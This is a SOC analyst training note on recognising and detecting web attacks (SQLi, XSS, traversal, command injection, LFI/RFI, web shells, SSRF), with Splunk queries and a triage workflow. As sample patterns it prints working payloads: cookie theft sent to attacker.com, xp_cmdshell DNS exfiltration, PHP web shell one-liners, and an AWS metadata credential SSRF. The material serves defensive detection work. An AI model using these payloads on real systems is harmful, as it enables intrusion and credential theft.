---
{"dg-publish":true,"permalink":"/soc-l1-complete-knowledge-base/14-web-attacks/web-attacks-basics/","dgPassFrontmatter":true}
---

# Web Attacks Basics
#WebAttacks #SQLi #XSS #OWASP #SOC #Detection

---

## Why Web Attack Knowledge Matters in SOC

Web servers are the most exposed surface in any organization. Understanding web attack patterns lets you:
- Triage WAF and web proxy alerts without blind spots
- Distinguish legitimate scanning from real exploitation
- Identify post-exploitation activity (web shells)
- Write precise detection rules for your SIEM

**MITRE Initial Access techniques covered here:**
- T1190 — Exploit Public-Facing Application
- T1505.003 — Server Software Component: Web Shell
- T1059.007 — JavaScript
- T1071.001 — Web Protocols (C2 via HTTP)

---

## OWASP Top 10 — SOC Perspective

The OWASP Top 10 is the industry standard list of most critical web vulnerabilities. As SOC L1, you need to recognize these in logs and alerts.

| Rank | Vulnerability | Quick SOC Signature |
|------|--------------|---------------------|
| A01 | Broken Access Control | 403/401 → 200 from same IP |
| A02 | Cryptographic Failures | HTTP login forms, cleartext credentials |
| A03 | **Injection (SQLi, etc.)** | SQL keywords in URL/POST body |
| A04 | Insecure Design | Architecture-level, hard to detect |
| A05 | Security Misconfiguration | Default paths, error pages |
| A06 | Vulnerable Components | CVE-matched User-Agent/version |
| A07 | Auth & Session Failures | Session fixation, brute force |
| A08 | Software & Data Integrity | Tampered updates, CI/CD attacks |
| A09 | Logging & Monitoring Failures | Gaps in your own coverage |
| A10 | SSRF | Internal IP access from web app |

---

## SQL Injection (SQLi)

### What It Is
SQL injection occurs when user input is inserted unsanitized into a SQL query, allowing attackers to manipulate database logic, extract data, or execute OS commands.

**Why it matters in SOC:** SQLi is the most common web exploitation technique. It leaves distinctive signatures in HTTP logs.

### Attack Patterns to Recognize

**Classic Union-Based SQLi:**
```
GET /product?id=1 UNION SELECT username,password FROM users--
GET /search?q=1' OR '1'='1
GET /page?id=1' OR 1=1--
```

**Blind SQLi (Boolean-based):**
```
GET /product?id=1 AND 1=1   ← True condition (normal page returned)
GET /product?id=1 AND 1=2   ← False condition (blank/error page)
# Attacker compares responses to extract data bit by bit
```

**Time-Based Blind SQLi:**
```
GET /product?id=1; WAITFOR DELAY '0:0:5'--    (MSSQL)
GET /product?id=1 AND SLEEP(5)--              (MySQL)
# If page takes 5 seconds → SQL query executed → vulnerable
```

**Out-of-Band SQLi (DNS/HTTP):**
```
'; EXEC xp_cmdshell('nslookup attacker.com')--
# Data exfiltrated via DNS queries — harder to detect
```

**URL-Encoded Variants (Bypass Filters):**
```
%27 = '     (single quote)
%20 = space
%23 = #
%2D%2D = --
1+OR+1%3D1   (URL-encoded spaces and equals)
```

### Real-World SQLi Log Signature
```
# Apache access.log example:
192.168.1.100 - - [15/Jan/2024:02:31:42] "GET /search?q=1'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 4512

# What to look for:
# SQL keywords: UNION, SELECT, INSERT, DROP, UPDATE, DELETE, FROM, WHERE
# String delimiters: ', ", --, ;, #
# URL encoding of above
# Boolean conditions: OR 1=1, AND 1=2
# Time functions: SLEEP(), WAITFOR DELAY
```

### Detection Queries

**Splunk - SQLi Detection:**
```spl
index=web_logs
| rex field=uri_path "(?P<query_string>\?.*)"
| rex field=query_string "(?P<potential_sqli>(?i)(union|select|insert|delete|drop|update|from|where|having|group by|order by|exec|execute|cast|convert|declare|char|nchar|varchar|nvarchar|alter|create|waitfor|delay|sleep|benchmark|load_file|outfile))"
| where isnotnull(potential_sqli)
| stats count by src_ip, uri_path, potential_sqli
| sort -count
```

**Splunk - Successful SQLi (200 Response with SQLi Pattern):**
```spl
index=web_logs status=200
| search uri_path IN ("*UNION*","*SELECT*","*' OR*","*1=1*","*SLEEP(*","*WAITFOR*")
| table _time, src_ip, uri_path, status, bytes
```

**False Positives:**
- Security scanners (Qualys, Burp Suite, Nessus) — whitelist scanner IPs
- Developers testing input validation
- Legitimate search queries containing "select" (rare but possible)

---

## Cross-Site Scripting (XSS)

### What It Is
XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. In a SOC context, you care about:
- **Stored XSS** → Persisted in database, hits every visitor
- **Reflected XSS** → In URL, requires victim to click link
- **DOM-based XSS** → Client-side, harder to detect server-side

**Why it matters in SOC:** XSS is used for session hijacking, credential theft, and malware delivery. More relevant for developers, but SOC detects the attack attempts.

### Attack Patterns
```html
<!-- Basic XSS test -->
<script>alert(1)</script>

<!-- Cookie stealing -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- Image onerror -->
<img src=x onerror="alert(1)">

<!-- Encoded variants -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E
&lt;script&gt;alert(1)&lt;/script&gt;
<ScRiPt>alert(1)</sCrIpT>   ← Case variation bypass
```

### Detection Query
```spl
index=web_logs
| search uri_path IN ("*<script*","*%3Cscript*","*onerror*","*onload*","*javascript:*","*alert(*")
| table _time, src_ip, uri_path, status, user_agent
```

---

## Directory Traversal / Path Traversal

### What It Is
Attacker manipulates file path parameters to access files outside the web root. Can expose system files like `/etc/passwd`, `win.ini`, config files.

### Attack Patterns
```
GET /download?file=../../../../etc/passwd
GET /view?page=../../../windows/win.ini
GET /img?src=..%2F..%2F..%2Fetc%2Fpasswd    (URL encoded)
GET /img?src=....//....//etc/passwd           (Double dot bypass)
```

**What Successful Traversal Looks Like:**
```
HTTP 200 response containing:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

### Detection Query
```spl
index=web_logs
| search uri_path IN ("*../*","*%2e%2e%2f*","*..%2f*","*%2e%2e/*","*..../*")
| table _time, src_ip, uri_path, status, bytes
```

---

## Command Injection / OS Command Injection

### What It Is
User-supplied data is passed to a system shell command without sanitization, allowing arbitrary OS command execution.

**Why it matters:** Command injection = direct remote code execution. If exploited, the attacker has shell access with the web server's privileges.

### Attack Patterns
```
# Basic injection separators:
; cat /etc/passwd
| cat /etc/passwd
&& cat /etc/passwd
`cat /etc/passwd`     (backtick)
$(cat /etc/passwd)    (subshell)

# URL-encoded variants:
%3B cat /etc/passwd   (;)
%7C cat /etc/passwd   (|)

# Common in ping/traceroute features:
GET /ping?host=127.0.0.1;cat /etc/passwd
GET /dns?lookup=example.com|id;whoami
```

### Detection Query
```spl
index=web_logs
| search uri_path IN ("*;*cat*","*|*id*","*;*whoami*","*`*`*","*$(*","*%3B*","*%7C*cmd*")
| table _time, src_ip, uri_path, status
```

---

## Local File Inclusion (LFI) & Remote File Inclusion (RFI)

### LFI — Read/Execute Local Files
```
GET /page?include=../../../../etc/passwd
GET /view.php?file=/etc/shadow
GET /page?lang=../../../proc/self/environ

# Log poisoning via LFI (advanced):
1. Attacker sends: GET /page HTTP/1.1
   User-Agent: <?php system($_GET['cmd']); ?>
   # This is logged to access.log
2. Then: GET /view.php?file=../../../var/log/apache2/access.log&cmd=id
   # Executes PHP from log file
```

### RFI — Execute Remote Files
```
GET /page?include=http://attacker.com/shell.txt
GET /page?file=http://evil.com/malware.php
# Requires allow_url_include=On in PHP (rare in modern configs)
```

### Detection Query
```spl
index=web_logs
| search uri_path IN ("*file=http*","*include=http*","*page=http*","*lang=http*")
OR uri_path IN ("*file=/etc*","*include=/proc*","*file=../etc*")
| table _time, src_ip, uri_path, status
```

---

## Web Shell Detection

### What Is a Web Shell?
A web shell is a malicious script (PHP, ASPX, JSP) uploaded to a web server that provides persistent remote access via HTTP. It's one of the most common post-exploitation artifacts.

**Why it matters in SOC:** Web shells are persistent, hard to find, and give attackers full command execution through normal HTTP traffic that bypasses firewall rules.

### Common Web Shell Signatures

**PHP Web Shell Examples:**
```php
<!-- Simple one-liner web shell -->
<?php system($_GET['cmd']); ?>
<?php eval(base64_decode($_POST['code'])); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>

<!-- Common filenames attackers use -->
c99.php, r57.php, shell.php, cmd.php, upload.php
webshell.php, test.php, info.php, update.php
```

**ASPX Web Shell:**
```aspx
<%Response.Write(new System.Diagnostics.Process()...)%>
```

### Web Shell Access Patterns in Logs
```
# Normal page: GET /page.php → 200, varies bytes, GET method
# Web shell: POST /upload.php → 200, suspicious, cmd parameter

# Red flags in access log:
1. POST requests to PHP files that normally accept GET
2. Requests with cmd=, command=, exec=, shell= parameters
3. Small file size for PHP that should be large HTML page
4. Access from unusual IPs to specific PHP file repeatedly
5. 200 response containing command output text

# Example web shell access:
POST /uploads/images/thumbnail.php HTTP/1.1
cmd=whoami

Response: www-data
```

### Web Shell Detection Queries

**Splunk - Detect POST to PHP in Upload Directory:**
```spl
index=web_logs method=POST
| search uri_path IN ("*upload*","*images*","*files*","*media*","*temp*")
| search uri_path="*.php"
| table _time, src_ip, uri_path, status, bytes, user_agent
```

**Splunk - Detect Web Shell Commands:**
```spl
index=web_logs
| search uri_query IN ("*cmd=*","*command=*","*exec=*","*shell=*","*system(*","*passthru*","*eval(*")
| table _time, src_ip, uri_path, uri_query, status, bytes
```

**Find New PHP Files (Linux - On Server):**
```bash
# Files created in last 24 hours in web root
find /var/www -name "*.php" -mtime -1 -type f

# PHP files containing dangerous functions
find /var/www -name "*.php" -exec grep -l "eval\|base64_decode\|system\|shell_exec\|passthru\|exec\|assert" {} \;

# PHP files in upload/images directories (shouldn't have PHP there)
find /var/www/uploads -name "*.php" -o -name "*.phtml" -o -name "*.php5"
```

---

## Authentication Attacks on Web Applications

### Credential Brute Force Against Login Pages

**Detection Patterns:**
```
# Many POST requests to /login from same IP
# 401/403 responses followed by eventual 200/302
# Same username tried with many passwords
# Automated: exact same request interval, no variation in timing

# Example log pattern:
192.168.1.100 POST /login 401 - "python-requests/2.28.0"
192.168.1.100 POST /login 401 - "python-requests/2.28.0"
192.168.1.100 POST /login 200 - "python-requests/2.28.0"  ← SUCCESS
```

**Detection Query:**
```spl
index=web_logs method=POST uri_path="/login"
| stats count as attempts, dc(status) as status_variety by src_ip
| where attempts > 20
| sort -attempts
```

### IDOR (Insecure Direct Object Reference)

An attacker changes an ID parameter to access other users' data.

```
# Attacker's normal request:
GET /account?id=1001 → Returns attacker's data

# IDOR attack:
GET /account?id=1002 → Returns victim's data
GET /account?id=1003 → Returns another victim

# Detection: Sequential ID access from one user in short time
```

**Detection Query:**
```spl
index=web_logs uri_path="/account" method=GET
| rex field=uri_query "id=(?P<account_id>\d+)"
| stats dc(account_id) as unique_ids, count as requests by src_ip, user
| where unique_ids > 10
| sort -unique_ids
```

---

## SSRF (Server-Side Request Forgery)

### What It Is
Attacker tricks the server into making HTTP requests to internal resources. Used to:
- Access AWS metadata service (169.254.169.254)
- Scan internal network
- Access internal admin panels
- Cloud credential theft (AWS/GCP/Azure metadata)

### Attack Patterns
```
# Classic SSRF - access internal services
GET /fetch?url=http://192.168.1.1/admin
GET /proxy?target=http://localhost/admin

# Cloud metadata endpoint (critical - AWS credential theft)
GET /image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Bypass filters using alternate formats:
http://0x7f000001/admin          (hex IP for 127.0.0.1)
http://2130706433/admin          (decimal IP)
http://127.1/admin               (shortened)
```

**Detection Query:**
```spl
index=web_logs
| search uri_query IN ("*169.254.169.254*","*localhost*","*127.0.0.1*","*192.168.*","*10.0.*","*172.16.*")
| table _time, src_ip, uri_path, uri_query, status
```

---

## Web Attack Investigation Workflow

```
Alert: WAF or SIEM fires on web attack signature
          ↓
Step 1: Identify the attack type
  - Look at URL/POST body: SQLi? XSS? LFI? Command injection?
  - Check HTTP method: GET vs POST
  - Check User-Agent: Is it a known scanner?

Step 2: Determine success/failure
  - HTTP 200 with large response = potentially successful
  - HTTP 404/403/500 = likely failed
  - Response size varies from normal = data returned (SQLi success indicator)

Step 3: Check for web shell upload
  - Were any file upload endpoints accessed before/after?
  - Are there new PHP/ASPX/JSP files in web root? (Notify sysadmin)

Step 4: Check attacker scope
  - Is this one endpoint or scanning everything?
  - How many unique URLs did this IP hit?
  - Did they move from scanning to exploitation?

Step 5: Check for post-exploitation
  - After potential success: Any outbound connections from web server?
  - Any new processes spawned by web server process (apache, nginx)?
  - Any unusual files created in /tmp or web root?

Step 6: Response
  - Block attacker IP at WAF/firewall
  - If web shell found: Isolate, preserve evidence, escalate to IR
  - If data exfil suspected: Escalate P1
```

---

## Scanning vs Exploitation — How to Tell the Difference

```
SCANNING (Low Priority):
- Many different URLs hit in rapid succession
- High 404 error rate
- Tool-based User-Agent (nikto, sqlmap, wfuzz)
- Brief duration
- No successful exploitation patterns

EXPLOITATION ATTEMPT (Medium Priority):
- Focused on specific vulnerabilities in specific parameters
- Mix of test payloads + probing
- Manual or semi-automated

CONFIRMED EXPLOITATION (HIGH/CRITICAL Priority):
- 200 response to known exploit payload
- Response size anomaly (more data than expected)
- Web server spawning child processes
- Outbound connections from web server
- New files in web directories
```

---

## Common Attacker Tools to Recognize by User-Agent

```
sqlmap/1.7.x    → SQLi tool — automated SQL injection
nikto/2.x       → Web vulnerability scanner
wfuzz/3.x       → Web fuzzer
gobuster/3.x    → Directory/file brute forcer  
dirb            → Directory brute forcer
nuclei/2.x      → Vulnerability scanner
nmap            → Port scanner (sometimes used for web)
python-requests → Python HTTP library (automated attacks)
curl/7.x        → Could be legitimate or attacker tool
Go-http-client  → Often tools built in Go (scanners, etc.)
```

**Detection Query:**
```spl
index=web_logs
| search user_agent IN ("*sqlmap*","*nikto*","*wfuzz*","*gobuster*","*nuclei*","*python-requests*")
| stats count by src_ip, user_agent
| sort -count
```

---

## HTTP Response Code Analysis for Attack Detection

```spl
-- Status code distribution anomaly (scanning indicator)
index=web_logs
| stats count by status, src_ip
| eval status_class = case(
    status >= 200 AND status < 300, "Success",
    status >= 300 AND status < 400, "Redirect",
    status >= 400 AND status < 500, "Client Error",
    status >= 500, "Server Error"
  )
| stats count by src_ip, status_class
| where count > 100

-- High 500 error rate from single IP (exploitation attempts causing errors)
index=web_logs status>=500
| stats count by src_ip, uri_path
| where count > 10
| sort -count

-- IPs hitting many unique URLs (scanning)
index=web_logs
| stats dc(uri_path) as unique_paths by src_ip
| where unique_paths > 100
| sort -unique_paths
```

---

## MITRE ATT&CK Web Attack Mapping

| Attack | MITRE Technique | ID |
|--------|-----------------|-----|
| SQL Injection | Exploit Public-Facing Application | T1190 |
| XSS | Exploit Public-Facing Application | T1190 |
| Web Shell Upload | Server Software Component: Web Shell | T1505.003 |
| Directory Traversal | Exploit Public-Facing Application | T1190 |
| LFI/RFI | Exploit Public-Facing Application | T1190 |
| Credential Brute Force | Brute Force | T1110 |
| SSRF | Exploit Public-Facing Application | T1190 |
| Web Shell C2 | Web Service | T1071.001 |
| File Upload | User Execution: Malicious File | T1204.002 |
| SQL → OS Command | Command and Scripting Interpreter | T1059 |

---

## Tools for Web Attack Analysis

| Tool | Use | URL |
|------|-----|-----|
| Burp Suite Community | Manual web testing, intercept proxy | portswigger.net |
| OWASP ZAP | Web app scanner | zaproxy.org |
| sqlmap | Automated SQLi exploitation | sqlmap.org |
| Nikto | Web vulnerability scanner | cirt.net/nikto2 |
| Gobuster/Dirbuster | Directory/file brute forcing | github.com/OJ/gobuster |
| Wappalyzer | Tech stack identification | wappalyzer.com |
| Whatweb | Web tech fingerprinting | morningstarsecurity.com |

---

## Related Notes
- [[SOC_L1_Complete_Knowledge_Base/02_Networking/Networking_Fundamentals\|Networking_Fundamentals]]
- [[SOC_L1_Complete_Knowledge_Base/04_Linux/Linux_Logs_and_Commands\|Linux_Logs_and_Commands]]
- [[SOC_L1_Complete_Knowledge_Base/09_Incident_Response/SOC_Investigation_Playbooks\|SOC_Investigation_Playbooks]]
- [[SOC_L1_Complete_Knowledge_Base/11_Malware/Malware_Basics\|Malware_Basics]]
- [[SOC_L1_Complete_Knowledge_Base/07_MITRE/MITRE_ATTACK_Overview\|MITRE_ATTACK_Overview]]
- [[SOC_L1_Complete_Knowledge_Base/08_Detection_Engineering/Detection_Engineering\|Detection_Engineering]]
